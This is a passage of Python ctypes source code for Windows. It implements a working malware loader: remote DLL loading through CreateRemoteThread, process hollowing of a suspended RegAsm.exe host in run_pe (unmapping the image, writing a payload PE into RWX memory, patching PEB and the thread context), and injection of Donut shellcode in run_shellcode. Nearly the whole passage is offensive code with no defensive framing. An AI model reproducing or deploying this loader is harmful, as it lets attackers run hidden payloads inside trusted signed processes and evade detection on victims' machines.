        ctypes.c_void_p,
        ctypes.c_size_t,
        ctypes.c_void_p,
        ctypes.c_void_p,
        wintypes.DWORD,
        ctypes.POINTER(wintypes.DWORD),
    ]
    k32.CreateRemoteThread.restype = wintypes.HANDLE
    k32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
    k32.WaitForSingleObject.restype = wintypes.DWORD
    k32.GetExitCodeThread.argtypes = [wintypes.HANDLE, ctypes.POINTER(wintypes.DWORD)]
    k32.GetExitCodeThread.restype = wintypes.BOOL
    k32.CloseHandle.argtypes = [wintypes.HANDLE]
    k32.CloseHandle.restype = wintypes.BOOL
    k32.VirtualAllocEx.argtypes = [
        wintypes.HANDLE,
        ctypes.c_void_p,
        ctypes.c_size_t,
        wintypes.DWORD,
        wintypes.DWORD,
    ]
    k32.VirtualAllocEx.restype = ctypes.c_void_p
    k32.VirtualFreeEx.argtypes = [wintypes.HANDLE, ctypes.c_void_p, ctypes.c_size_t, wintypes.DWORD]
    k32.VirtualFreeEx.restype = wintypes.BOOL

    sysdir = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32")
    rva = None
    mod_base = None
    used_dll = None
    for disk_name, remote_name in (
        ("kernelbase.dll", "kernelbase.dll"),
        ("kernel32.dll", "kernel32.dll"),
    ):
        disk_path = os.path.join(sysdir, disk_name)
        rva = _parse_export_rva_from_disk(disk_path, ("LoadLibraryW",))
        if rva is None:
            _rp_log(f"remote LLW: no LoadLibraryW in {disk_path!r}")
            continue
        mod_base = _find_dll_base_peb_then_psapi(h_process, remote_name)
        if not mod_base:
            _rp_log(f"remote LLW: {remote_name} not found in target process module list")
            continue
        used_dll = disk_name
        break
    if not mod_base or rva is None:
        return None
    remote_load = (mod_base + rva) & 0xFFFFFFFFFFFFFFFF
    _rp_log(f"remote LLW: {used_dll} base=0x{mod_base:x} LoadLibraryW rva=0x{rva:x} -> entry 0x{remote_load:x}")

    buf = ctypes.create_unicode_buffer(dll_path_wide)
    sz = ctypes.sizeof(buf)
    remote_mem = k32.VirtualAllocEx(h_process, None, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    if not remote_mem:
        _rp_log("remote LLW: VirtualAllocEx(path buf) failed")
        _win_last_error(k32)
        return None
    try:
        n = ctypes.c_size_t(0)
        if not k32.WriteProcessMemory(
            h_process, ctypes.c_void_p(remote_mem), ctypes.byref(buf), sz, ctypes.byref(n)
        ):
            _rp_log("remote LLW: WriteProcessMemory(path) failed")
            _win_last_error(k32)
            return None
        tid = wintypes.DWORD(0)
        thr = k32.CreateRemoteThread(
            h_process,
            None,
            0,
            ctypes.c_void_p(remote_load),
            ctypes.c_void_p(remote_mem),
            0,
            ctypes.byref(tid),
        )
        if not thr:
            _rp_log("remote LLW: CreateRemoteThread failed")
            _win_last_error(k32)
            return None
        try:
            wt = k32.WaitForSingleObject(thr, 15000)
            if wt != 0:
                _rp_log(f"remote LLW: WaitForSingleObject -> {wt} (expected 0=WAIT_OBJECT_0)")
                return None
            ec = wintypes.DWORD(0)
            if not k32.GetExitCodeThread(thr, ctypes.byref(ec)):
                _rp_log("remote LLW: GetExitCodeThread failed")
                _win_last_error(k32)
                return None
            if ec.value == 0:
                _rp_log("remote LLW: LoadLibraryW returned NULL (module not loaded)")
                return None
            want = os.path.basename(dll_path_wide).lower()
            for name, base in _peb_ldr_modules_x64(h_process):
                if not name:
                    continue
                if name.split("\\")[-1] == want:
                    return base
            hit = _find_remote_module_base(h_process, want)
            if hit:
                return hit
            _rp_log(f"remote LLW: module {want!r} not in PEB/psapi after load (thread exit=0x{ec.value:x})")
            return None
        finally:
            k32.CloseHandle(thr)
    finally:
        k32.VirtualFreeEx(h_process, ctypes.c_void_p(remote_mem), 0, 0x8000)


def _ensure_remote_mscoree(h_process, mscoree_disk_path):
    """
    RegAsm often has not loaded mscoree.dll yet at CREATE_SUSPENDED — EnumProcessModules misses it.
    Try PEB/LDR, then remote LoadLibraryW(%SystemRoot%\\System32\\mscoree.dll).
    """
    b = _find_dll_base_peb_then_psapi(h_process, "mscoree.dll")
    if b:
        return b
    wide = mscoree_disk_path if mscoree_disk_path else os.path.join(
        os.environ.get("SystemRoot", r"C:\Windows"), "System32", "mscoree.dll"
    )
    if not os.path.isfile(wide):
        return None
    return _remote_loadlibrary_w_kernel32(h_process, os.path.normpath(wide))


def _dotnet_managed_entry_rva(exe_buffer, e_lfanew, pe):
    """Resolve RVA of managed entry (MethodDef) when PE AddressOfEntryPoint is 0."""
    sections = pe["sections"]
    opt_start = e_lfanew + 4 + 20
    is_pe64 = pe["opt_magic"] == IMAGE_NT_OPTIONAL_HDR64_MAGIC
    dd0 = _data_dir_offset_from_optional(opt_start, is_pe64)
    com_rva = struct.unpack_from("<I", exe_buffer, dd0 + 14 * 8)[0]
    com_sz = struct.unpack_from("<I", exe_buffer, dd0 + 14 * 8 + 4)[0]
    if com_rva == 0 or com_sz < 0x48:
        return None
    cor_off = _rva_to_file_offset(sections, com_rva)
    if cor_off is None:
        return None
    flags = struct.unpack_from("<I", exe_buffer, cor_off + 16)[0]
    ep_field = struct.unpack_from("<I", exe_buffer, cor_off + 20)[0]
    if flags & _COMIMAGE_FLAGS_NATIVE_ENTRYPOINT:
        return ep_field if ep_field != 0 else None
    entry_tok = ep_field
    tok_type = (entry_tok >> 24) & 0xFF
    rid = entry_tok & 0xFFFFFF
    if tok_type != 0x06 or rid == 0:
        return None

    md_rva = struct.unpack_from("<I", exe_buffer, cor_off + 8)[0]
    md_sz = struct.unpack_from("<I", exe_buffer, cor_off + 12)[0]
    md_off = _rva_to_file_offset(sections, md_rva)
    if md_off is None or md_sz < 16:
        return None
    if struct.unpack_from("<I", exe_buffer, md_off)[0] != 0x424A5342:
        return None
    ver_len = struct.unpack_from("<I", exe_buffer, md_off + 12)[0]
    p0 = md_off + 16 + ver_len
    p0 = (p0 + 3) & ~3
    nstreams = struct.unpack_from("<H", exe_buffer, p0 + 2)[0]
    p1 = p0 + 4
    tilde_abs = None
    tilde_sz = 0
    for _ in range(nstreams):
        so = struct.unpack_from("<I", exe_buffer, p1)[0]
        ss = struct.unpack_from("<I", exe_buffer, p1 + 4)[0]
        p1 += 8
        nm = bytearray()
        while True:
            c = exe_buffer[p1]
            p1 += 1
            if c == 0:
                break
            nm.append(c)
        p1 = (p1 + 3) & ~3
        name = nm.decode("ascii", errors="replace")
        if name in ("#~", "#-"):
            tilde_abs = md_off + so
            tilde_sz = ss
            break
    if tilde_abs is None:
        return None
    raw = memoryview(exe_buffer)[tilde_abs : tilde_abs + tilde_sz]
    heap_sizes = raw[6]
    valid = int.from_bytes(raw[8:16], "little")
    pos = 24
    rows = {}
    for tid in range(64):
        if valid & (1 << tid):
            rows[tid] = struct.unpack_from("<I", raw, pos)[0]
            pos += 4
    table0 = pos
    off = table0
    for tid in range(0x06):
        if not (valid & (1 << tid)):
            continue
        rs = _metadata_row_size(tid, rows, heap_sizes)
        if rs is None:
            return None
        off += rows[tid] * rs
    if not (valid & (1 << 0x06)):
        return None
    rs_m = _metadata_row_size(0x06, rows, heap_sizes)
    if rs_m is None or rid > rows.get(0x06, 0):
        return None
    row_off = off + (rid - 1) * rs_m
    method_rva = struct.unpack_from("<I", raw, row_off)[0]
    return method_rva if method_rva != 0 else None


def run_pe(exe_buffer, host_process, optional_args=""):
    kernel32 = ctypes.windll.kernel32
    ntdll = ctypes.windll.ntdll

    kernel32.VirtualAllocEx.restype = ctypes.c_void_p
    kernel32.VirtualAllocEx.argtypes = [
        wintypes.HANDLE,
        ctypes.c_void_p,
        ctypes.c_size_t,
        wintypes.DWORD,
        wintypes.DWORD,
    ]

    _rp_log(f"start: host={host_process!r} optional={optional_args!r} payload_len={len(exe_buffer)}")

    e_magic = struct.unpack("<H", exe_buffer[0:2])[0]
    if e_magic != IMAGE_DOS_SIGNATURE:
        _rp_log(f"FAIL: bad DOS signature e_magic=0x{e_magic:04x}")
        return False

    e_lfanew = struct.unpack("<I", exe_buffer[0x3C:0x40])[0]
    _rp_log(f"DOS OK: e_lfanew=0x{e_lfanew:x}")

    nt_sign = struct.unpack("<I", exe_buffer[e_lfanew : e_lfanew + 4])[0]
    if nt_sign != IMAGE_NT_SIGNATURE:
        _rp_log(f"FAIL: bad NT signature 0x{nt_sign:08x}")
        return False

    try:
        pe = _parse_pe_optional(exe_buffer, e_lfanew)
    except ValueError as e:
        _rp_log(f"FAIL: {e}")
        return False

    is_pe32 = pe["opt_magic"] == IMAGE_NT_OPTIONAL_HDR32_MAGIC
    is_pe64 = pe["opt_magic"] == IMAGE_NT_OPTIONAL_HDR64_MAGIC

    arch = "PE32" if is_pe32 else "PE32+" if is_pe64 else "?"
    mach = "I386" if pe["machine"] == IMAGE_FILE_MACHINE_I386 else "AMD64" if pe["machine"] == IMAGE_FILE_MACHINE_AMD64 else f"0x{pe['machine']:04x}"

    _rp_log(
        f"NT OK: {arch} machine={mach} sections={pe['num_sections']} "
        f"SizeOfOptionalHeader=0x{pe['size_opt']:x} subsystem={pe['subsystem']} "
        f"DllCharacteristics=0x{pe['dll_char']:04x} FileCharacteristics=0x{pe['file_chars']:04x} "
        f"({'DLL' if pe['file_chars'] & IMAGE_FILE_DLL else 'not marked DLL in file header'})"
    )

    if is_pe32 and pe["machine"] != IMAGE_FILE_MACHINE_I386:
        _rp_log("FAIL: PE32 optional header but machine is not I386")
        return False
    if is_pe64 and pe["machine"] != IMAGE_FILE_MACHINE_AMD64:
        _rp_log("FAIL: PE32+ optional header but machine is not AMD64")
        return False
    if not is_pe32 and not is_pe64:
        _rp_log("FAIL: optional header must be PE32 (0x10B) or PE32+ (0x20B)")
        return False

    # Hollow host bitness must match payload: Framework64 RegAsm is native x64 — its initial
    # thread is not WOW64, so Wow64GetThreadContext fails (87). PE32 needs Framework (x86) RegAsm.
    _REGASM_X86 = r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe"
    _REGASM_X64 = r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe"
    host_norm = host_process.replace("/", "\\").lower()
    if pe["machine"] == IMAGE_FILE_MACHINE_I386:
        if "framework64" in host_norm:
            if os.path.isfile(_REGASM_X86):
                _rp_log(
                    "PE32 payload: using 32-bit RegAsm host (WOW64); "
                    "Framework64 host would be native x64 and breaks Wow64GetThreadContext."
                )
                host_process = _REGASM_X86
            else:
                _rp_log(f"FAIL: PE32 payload needs 32-bit hollow host; missing {_REGASM_X86!r}")
                return False
    elif pe["machine"] == IMAGE_FILE_MACHINE_AMD64:
        if "framework64" not in host_norm and r"\framework\v4.0" in host_norm:
            if os.path.isfile(_REGASM_X64):
                _rp_log("PE32+ payload: using 64-bit RegAsm host (Framework64).")
                host_process = _REGASM_X64
            else:
                _rp_log(f"FAIL: PE32+ payload needs 64-bit hollow host; missing {_REGASM_X64!r}")
                return False

    command_line = host_process
    if optional_args:
        command_line += f" {optional_args}"
    cmd_buf = ctypes.create_string_buffer(command_line.encode("utf-8"))

    image_base = pe["image_base"]
    size_of_image = pe["size_of_image"]
    size_of_headers = pe["size_of_headers"]
    entry_point = pe["entry_point"]
    num_sections = pe["num_sections"]
    section_offset = pe["section_offset"]
    # Pure managed: must start via mscoree._CorExeMain(imageBase), not MethodDef RVA as native RIP.
    use_clr_cor_exe_main = False

    _rp_log(
        f"ImageBase=0x{image_base:x} SizeOfImage={size_of_image} SizeOfHeaders={size_of_headers} "
        f"AddressOfEntryPoint=0x{entry_point:x} first_section_file_off=0x{section_offset:x}"
    )
    if entry_point == 0:
        managed_ep = _dotnet_managed_entry_rva(exe_buffer, e_lfanew, pe)
        if managed_ep is not None and managed_ep != 0:
            entry_point = managed_ep
            use_clr_cor_exe_main = True
            _rp_log(
                f"PE AddressOfEntryPoint=0; resolved managed MethodDef RVA=0x{entry_point:x} "
                f"(x64 thread will use mscoree._CorExeMain, not this RVA as Rip)"
            )
        else:
            _rp_log(
                "FAIL: AddressOfEntryPoint is 0 and CLR metadata entry could not be resolved. "
                "Pure managed image or unsupported metadata."
            )
            return False

    mscoree_disk_path = None
    remote_mscoree_cached = None

    use_wow64_ctx = is_pe32 and _is_64bit_python()
    if is_pe64:
        _rp_log(f"using CONTEXT buffer size 0x{CTX_AMD64_SIZE:x} (AMD64)")
    elif use_wow64_ctx:
        _rp_log(f"using WOW64_CONTEXT size 0x{ctypes.sizeof(WOW64_CONTEXT):x} (Wow64GetThreadContext)")
    else:
        _rp_log(f"using CONTEXT buffer size 0x{CTX_X86_SIZE:x} (x86, NtGetContextThread)")

    si = STARTUPINFO()
    si.cb = ctypes.sizeof(si)
    pi = PROCESS_INFORMATION()

    if not kernel32.CreateProcessA(
        None,
        cmd_buf,
        None,
        None,
        False,
        CREATE_SUSPENDED,
        None,
        None,
        ctypes.byref(si),
        ctypes.byref(pi),
    ):
        _rp_log("FAIL: CreateProcessA returned 0")
        _win_last_error(kernel32)
        return False
    _rp_log(f"CreateProcessA OK pid={pi.dwProcessId} tid={pi.dwThreadId}")

    if use_clr_cor_exe_main and is_pe64:
        sysroot = os.environ.get("SystemRoot", r"C:\Windows")
        cand = os.path.join(sysroot, "System32", "mscoree.dll")
        if not os.path.isfile(cand):
            alt = os.path.join(sysroot, "SysWOW64", "mscoree.dll")
            if os.path.isfile(alt):
                cand = alt
        mscoree_disk_path = cand if os.path.isfile(cand) else None
        if mscoree_disk_path:
            remote_mscoree_cached = _ensure_remote_mscoree(pi.hProcess, mscoree_disk_path)
            if remote_mscoree_cached:
                _rp_log(f"remote mscoree.dll base=0x{remote_mscoree_cached:x} (before NtUnmap; delay-load safe)")
            else:
                _rp_log("WARN: mscoree.dll not in module list and remote LoadLibraryW failed")

    host_img = _get_child_image_base(pi.hProcess, is_pe64, use_wow64_ctx)
    if host_img is not None:
        img_ptr = host_img if is_pe64 else (host_img & 0xFFFFFFFF)
        want = image_base if is_pe64 else (image_base & 0xFFFFFFFF)
        _rp_log(f"hollow host base (PEB)=0x{img_ptr:x}; PE preferred ImageBase=0x{want:x}")
    else:
        img_ptr = image_base if is_pe64 else (image_base & 0xFFFFFFFF)
        _rp_log(f"PEB image base query failed; using PE ImageBase 0x{img_ptr:x}")

    st_unmap = ntdll.NtUnmapViewOfSection(pi.hProcess, ctypes.c_void_p(img_ptr))
    _rp_log(f"NtUnmapViewOfSection -> NTSTATUS 0x{st_unmap & 0xffffffff:08x}")

    alloc_size = _round_up_alloc_size(size_of_image)
    _rp_log(f"remote alloc size: SizeOfImage={size_of_image} -> rounded={alloc_size}")

    remote_base = kernel32.VirtualAllocEx(
        pi.hProcess,
        ctypes.c_void_p(img_ptr),
        alloc_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    )
    used_null_alloc = False
    if not remote_base:
        err0 = kernel32.GetLastError()
        _rp_log(
            f"VirtualAllocEx at hollow base 0x{img_ptr:x} failed (err={err0}); "
            f"retrying with lpAddress=NULL + base relocations"
        )
        remote_base = kernel32.VirtualAllocEx(
            pi.hProcess,
            None,
            alloc_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
        used_null_alloc = bool(remote_base)
        if not remote_base:
            _rp_log("FAIL: VirtualAllocEx(NULL) also returned NULL")
            _win_last_error(kernel32)
            kernel32.TerminateProcess(pi.hProcess, 0)
            return False

    rb = ctypes.cast(remote_base, ctypes.c_void_p).value or 0
    rb = int(rb) if rb is not None else 0
    _rp_log(f"VirtualAllocEx OK remote_base=0x{rb:x}" + (" (system-chosen VA)" if used_null_alloc else ""))

    opt_start = e_lfanew + 24
    if rb != image_base:
        _apply_base_relocations(exe_buffer, pe, opt_start, is_pe64, image_base, rb)
    if is_pe64:
        if rb != image_base:
            struct.pack_into("<Q", exe_buffer, opt_start + 0x18, rb & 0xFFFFFFFFFFFFFFFF)
            _rp_log(f"rebasing: patched PE32+ Optional.ImageBase -> 0x{rb:x}")
    else:
        rb32 = rb & 0xFFFFFFFF
        pe32_img = image_base & 0xFFFFFFFF
        if rb32 != pe32_img:
            struct.pack_into("<I", exe_buffer, opt_start + 0x1C, rb32)
            _rp_log(f"rebasing: patched PE32 Optional.ImageBase -> 0x{rb32:x}")

    hdr_buf = _wpm_source_bytes(exe_buffer, 0, size_of_headers)
    wpm = kernel32.WriteProcessMemory(pi.hProcess, ctypes.c_void_p(rb), hdr_buf, size_of_headers, None)
    if not wpm:
        _rp_log("FAIL: WriteProcessMemory(headers)")
        _win_last_error(kernel32)
        kernel32.TerminateProcess(pi.hProcess, 0)
        return False
    _rp_log(f"WriteProcessMemory headers OK ({size_of_headers} bytes)")

    for i in range(num_sections):
        start = section_offset + (i * 0x28)
        virt_addr = struct.unpack("<I", exe_buffer[start + 0xC : start + 0x10])[0]
        raw_size = struct.unpack("<I", exe_buffer[start + 0x10 : start + 0x14])[0]
        raw_ptr = struct.unpack("<I", exe_buffer[start + 0x14 : start + 0x18])[0]
        name = exe_buffer[start : start + 8].split(b"\0", 1)[0].decode("ascii", errors="replace")

        dest = rb + virt_addr
        _rp_log(f"section[{i}] {name!r} VA=0x{virt_addr:x} raw_size={raw_size} raw_ptr=0x{raw_ptr:x} -> dest=0x{dest:x}")
        if raw_size <= 0:
            continue
        sec_buf = _wpm_source_bytes(exe_buffer, raw_ptr, raw_size)
        wpm = kernel32.WriteProcessMemory(pi.hProcess, ctypes.c_void_p(dest), sec_buf, raw_size, None)
        if not wpm:
            _rp_log(f"FAIL: WriteProcessMemory section {i}")
            _win_last_error(kernel32)
            kernel32.TerminateProcess(pi.hProcess, 0)
            return False

    ctx = None
    wow64 = None
    if is_pe64:
        ctx = (ctypes.c_ubyte * CTX_AMD64_SIZE)()
        _ctx_pack_u32(ctx, CTX64_OFF_CTXFLAGS, CONTEXT_FULL)
        st_gctx = ntdll.NtGetContextThread(pi.hThread, ctypes.byref(ctx))
        if st_gctx != 0:
            _rp_log(f"FAIL: NtGetContextThread NTSTATUS=0x{st_gctx & 0xffffffff:08x}")
            kernel32.TerminateProcess(pi.hProcess, 0)
            return False
    elif use_wow64_ctx:
        _rp_log("context: Wow64GetThreadContext (64-bit Python + 32-bit / WOW64 child)")
        if not hasattr(kernel32, "Wow64GetThreadContext"):
            _rp_log("FAIL: Wow64GetThreadContext not available")
            kernel32.TerminateProcess(pi.hProcess, 0)
            return False
        wow64 = WOW64_CONTEXT()
        wow64.ContextFlags = CONTEXT_FULL
        if not kernel32.Wow64GetThreadContext(pi.hThread, ctypes.byref(wow64)):
            _rp_log("FAIL: Wow64GetThreadContext returned 0")
            _win_last_error(kernel32)
            kernel32.TerminateProcess(pi.hProcess, 0)
            return False
    else:
        ctx = (ctypes.c_ubyte * CTX_X86_SIZE)()
        _ctx_pack_u32(ctx, CTX32_OFF_CTXFLAGS, CONTEXT_FULL)
        st_gctx = ntdll.NtGetContextThread(pi.hThread, ctypes.byref(ctx))
        if st_gctx != 0:
            _rp_log(f"FAIL: NtGetContextThread NTSTATUS=0x{st_gctx & 0xffffffff:08x}")
            kernel32.TerminateProcess(pi.hProcess, 0)
            return False

    if is_pe64:
        new_rip = None
        rdx = _ctx_unpack_u64(ctx, CTX64_OFF_RDX)
        rcx = _ctx_unpack_u64(ctx, CTX64_OFF_RCX)
        rip = _ctx_unpack_u64(ctx, CTX64_OFF_RIP)
        _rp_log(f"thread context OK Rdx=0x{rdx:x} Rcx=0x{rcx:x} Rip=0x{rip:x}")
        remote_val = ctypes.c_uint64(rb)
        wpm = kernel32.WriteProcessMemory(
            pi.hProcess, ctypes.c_void_p(rdx + 0x10), ctypes.byref(remote_val), ctypes.sizeof(remote_val), None
        )
        if not wpm:
            _rp_log("FAIL: WriteProcessMemory(PEB ImageBase x64)")
            _win_last_error(kernel32)
            kernel32.TerminateProcess(pi.hProcess, 0)
            return False
        # RegAsm's thread was still in ntdll RtlUserThreadStart — must set Rip into payload / CLR bootstrap.
        if use_clr_cor_exe_main:
            mscoree_path = mscoree_disk_path or os.path.join(
                os.environ.get("SystemRoot", r"C:\Windows"), "System32", "mscoree.dll"
            )
            cor_rva = _parse_export_rva_from_disk(mscoree_path, ("_CorExeMain", "__CorExeMain")) if mscoree_path and os.path.isfile(mscoree_path) else None
            remote_mscoree = remote_mscoree_cached or _ensure_remote_mscoree(pi.hProcess, mscoree_disk_path)
            if cor_rva and remote_mscoree:
                new_rip = (remote_mscoree + cor_rva) & 0xFFFFFFFFFFFFFFFF
                _ctx_pack_u64(ctx, CTX64_OFF_RIP, new_rip)
                _ctx_pack_u64(ctx, CTX64_OFF_RCX, rb & 0xFFFFFFFFFFFFFFFF)
                rsp0 = _ctx_unpack_u64(ctx, CTX64_OFF_RSP)
                rsp1 = rsp0 & ~0xF
                if rsp1 != rsp0:
                    _ctx_pack_u64(ctx, CTX64_OFF_RSP, rsp1)
                    _rp_log(f"aligned Rsp 0x{rsp0:x} -> 0x{rsp1:x} for x64 entry")
                _rp_log(
                    f"CLR bootstrap: Rip=mscoree+_CorExeMain 0x{new_rip:x} (mscoree=0x{remote_mscoree:x} rva=0x{cor_rva:x}) "
                    f"Rcx=imageBase 0x{rb:x}; patched PEB.ImageBase @ [Rdx+0x10]"
                )
            else:
                _rp_log(
                    f"WARN: _CorExeMain resolve failed (path={mscoree_path!r} rva={cor_rva} remote_mscoree={remote_mscoree}); "
                    f"falling back to Rip=image+MethodDef (may CLR-fail)"
                )
        if new_rip is None:
            new_rip = (rb + entry_point) & 0xFFFFFFFFFFFFFFFF
            _ctx_pack_u64(ctx, CTX64_OFF_RIP, new_rip)
            _ctx_pack_u64(ctx, CTX64_OFF_RCX, rb & 0xFFFFFFFFFFFFFFFF)
            _rp_log(f"x64 entry: Rip=0x{new_rip:x} Rcx=imageBase 0x{rb:x}; patched PEB.ImageBase @ [Rdx+0x10]")
    elif use_wow64_ctx:
        ebx = int(wow64.Ebx)
        eax = int(wow64.Eax)
        _rp_log(f"thread context OK Ebx=0x{ebx:x} Eax=0x{eax:x}")
        if ebx == 0:
            _rp_log("FAIL: Ebx is 0 — cannot patch PEB ImageBase (WOW64_CONTEXT).")
            kernel32.TerminateProcess(pi.hProcess, 0)
            return False
        remote_val = ctypes.c_uint32(rb & 0xFFFFFFFF)
        wpm = kernel32.WriteProcessMemory(
            pi.hProcess, ctypes.c_void_p(ebx + 8), ctypes.byref(remote_val), ctypes.sizeof(remote_val), None
        )
        if not wpm:
            _rp_log("FAIL: WriteProcessMemory(PEB ImageBase x86 WOW64)")
            _win_last_error(kernel32)
            kernel32.TerminateProcess(pi.hProcess, 0)
            return False
        new_eax = (rb + entry_point) & 0xFFFFFFFF
        wow64.Eax = new_eax
        _rp_log(f"patched ImageBase @ [Ebx+8]; entry Eax=0x{new_eax:x}")
    else:
        ebx = _ctx_unpack_u32(ctx, CTX32_OFF_EBX)
        eax = _ctx_unpack_u32(ctx, CTX32_OFF_EAX)
        _rp_log(f"thread context OK Ebx=0x{ebx:x} Eax=0x{eax:x}")
        if ebx == 0:
            _rp_log(
                "FAIL: Ebx is 0 — cannot patch PEB ImageBase. "
                "On 64-bit Python, Wow64GetThreadContext must succeed for 32-bit children; "
                "or run 32-bit Python for PE32 payloads."
            )
            kernel32.TerminateProcess(pi.hProcess, 0)
            return False
        remote_val = ctypes.c_uint32(rb & 0xFFFFFFFF)
        wpm = kernel32.WriteProcessMemory(
            pi.hProcess, ctypes.c_void_p(ebx + 8), ctypes.byref(remote_val), ctypes.sizeof(remote_val), None
        )
        if not wpm:
            _rp_log("FAIL: WriteProcessMemory(PEB ImageBase x86)")
            _win_last_error(kernel32)
            kernel32.TerminateProcess(pi.hProcess, 0)
            return False
        new_eax = (rb + entry_point) & 0xFFFFFFFF
        _ctx_pack_u32(ctx, CTX32_OFF_EAX, new_eax)
        _rp_log(f"patched ImageBase @ [Ebx+8]; entry Eax=0x{new_eax:x}")

    if is_pe64:
        st_sctx = ntdll.NtSetContextThread(pi.hThread, ctypes.byref(ctx))
        if st_sctx != 0:
            _rp_log(f"FAIL: NtSetContextThread NTSTATUS=0x{st_sctx & 0xffffffff:08x}")
            kernel32.TerminateProcess(pi.hProcess, 0)
            return False
        _rp_log("NtSetContextThread OK")
    elif use_wow64_ctx:
        if not kernel32.Wow64SetThreadContext(pi.hThread, ctypes.byref(wow64)):
            _rp_log("FAIL: Wow64SetThreadContext returned 0")
            _win_last_error(kernel32)
            kernel32.TerminateProcess(pi.hProcess, 0)
            return False
        _rp_log("Wow64SetThreadContext OK")
    else:
        st_sctx = ntdll.NtSetContextThread(pi.hThread, ctypes.byref(ctx))
        if st_sctx != 0:
            _rp_log(f"FAIL: NtSetContextThread NTSTATUS=0x{st_sctx & 0xffffffff:08x}")
            kernel32.TerminateProcess(pi.hProcess, 0)
            return False
        _rp_log("NtSetContextThread OK")

    rc = kernel32.ResumeThread(pi.hThread)
    _rp_log(f"ResumeThread -> {rc}")
    if rc == -1 or rc == 0xFFFFFFFF:
        _win_last_error(kernel32)
        return False
    _rp_log("done: returning True")
    return True


def run_shellcode(shellcode, host_process, optional_args=""):
    """
    Run Donut PIC in a suspended x64 host (e.g. RegAsm): allocate separate RWX memory,
    write shellcode, point the main thread at it and resume.

    We intentionally do *not* NtUnmapViewOfSection the host EXE or patch PEB.ImageBase to
    the shellcode region: the loader list would still reference the unmapped image base and
    APIs / Donut would fault with STATUS_ACCESS_VIOLATION (0xC0000005).
    """
    if not _is_64bit_python():
        _rp_log("FAIL: run_shellcode requires 64-bit Python (AMD64 hollow host).")
        return False

    kernel32 = ctypes.windll.kernel32
    ntdll = ctypes.windll.ntdll
    kernel32.VirtualAllocEx.restype = ctypes.c_void_p
    kernel32.VirtualAllocEx.argtypes = [
        wintypes.HANDLE,
        ctypes.c_void_p,
        ctypes.c_size_t,
        wintypes.DWORD,
        wintypes.DWORD,
    ]

    sc = bytes(shellcode)
    n = len(sc)
    _rp_log(f"shellcode start: host={host_process!r} optional={optional_args!r} len={n}")
    if n < 64:
        _rp_log("FAIL: shellcode buffer too small")
        return False

    host_norm = host_process.replace("/", "\\").lower()
    if "framework64" not in host_norm:
        if os.path.isfile(_REGASM_FRAMEWORK64):
            host_process = _REGASM_FRAMEWORK64
            _rp_log("shellcode: using Framework64 RegAsm as hollow host (AMD64).")

    command_line = host_process + (f" {optional_args}" if optional_args else "")
    cmd_buf = ctypes.create_string_buffer(command_line.encode("utf-8"))

    si = STARTUPINFO()
    si.cb = ctypes.sizeof(si)
    pi = PROCESS_INFORMATION()
    if not kernel32.CreateProcessA(
        None,
        cmd_buf,
        None,
        None,
        False,
        CREATE_SUSPENDED,
        None,
        None,
        ctypes.byref(si),
        ctypes.byref(pi),
    ):
        _rp_log("FAIL: CreateProcessA returned 0")
        _win_last_error(kernel32)
        return False
    _rp_log(f"CreateProcessA OK pid={pi.dwProcessId} tid={pi.dwThreadId}")

    is_pe64 = True
    use_wow64_ctx = False
    host_img = _get_child_image_base(pi.hProcess, is_pe64, use_wow64_ctx)
    if host_img is not None:
        _rp_log(f"host exe remains mapped (PEB ImageBase)=0x{host_img:x}; shellcode uses a new region")

    alloc_size = (n + 0xFFF) & ~0xFFF
    if alloc_size < 0x1000:
        alloc_size = 0x1000
    _rp_log(f"remote alloc size: shellcode {n} -> rounded={alloc_size}")

    remote_base = kernel32.VirtualAllocEx(
        pi.hProcess,
        None,
        alloc_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    )
    if not remote_base:
        _rp_log("FAIL: VirtualAllocEx(NULL) for shellcode")
        _win_last_error(kernel32)
        kernel32.TerminateProcess(pi.hProcess, 0)
        return False

    rb = int(ctypes.cast(remote_base, ctypes.c_void_p).value or 0)
    _rp_log(f"VirtualAllocEx OK remote_base=0x{rb:x}")

    sc_buf = (ctypes.c_char * n).from_buffer_copy(sc)
    if not kernel32.WriteProcessMemory(pi.hProcess, ctypes.c_void_p(rb), sc_buf, n, None):
        _rp_log("FAIL: WriteProcessMemory(shellcode)")
        _win_last_error(kernel32)
        kernel32.TerminateProcess(pi.hProcess, 0)
        return False
    _rp_log(f"WriteProcessMemory shellcode OK ({n} bytes)")

    ctx = (ctypes.c_ubyte * CTX_AMD64_SIZE)()
    _ctx_pack_u32(ctx, CTX64_OFF_CTXFLAGS, CONTEXT_FULL)
    st_gctx = ntdll.NtGetContextThread(pi.hThread, ctypes.byref(ctx))
    if st_gctx != 0:
        _rp_log(f"FAIL: NtGetContextThread NTSTATUS=0x{st_gctx & 0xffffffff:08x}")
        kernel32.TerminateProcess(pi.hProcess, 0)
        return False

    rdx = _ctx_unpack_u64(ctx, CTX64_OFF_RDX)
    rip = _ctx_unpack_u64(ctx, CTX64_OFF_RIP)
    _rp_log(f"thread context OK Rdx=0x{rdx:x} Rip=0x{rip:x}")

    new_rip = rb & 0xFFFFFFFFFFFFFFFF
    _ctx_pack_u64(ctx, CTX64_OFF_RIP, new_rip)
    _ctx_pack_u64(ctx, CTX64_OFF_RCX, 0)
    rsp0 = _ctx_unpack_u64(ctx, CTX64_OFF_RSP)
    rsp1 = rsp0 & ~0xF
    if rsp1 != rsp0:
        _ctx_pack_u64(ctx, CTX64_OFF_RSP, rsp1)
        _rp_log(f"aligned Rsp 0x{rsp0:x} -> 0x{rsp1:x}")
    _rp_log(f"donut entry: Rip=0x{new_rip:x} Rcx=0 (PEB / host image left unchanged)")

    st_sctx = ntdll.NtSetContextThread(pi.hThread, ctypes.byref(ctx))
    if st_sctx != 0:
        _rp_log(f"FAIL: NtSetContextThread NTSTATUS=0x{st_sctx & 0xffffffff:08x}")
        kernel32.TerminateProcess(pi.hProcess, 0)
        return False
    _rp_log("NtSetContextThread OK")

    rc = kernel32.ResumeThread(pi.hThread)
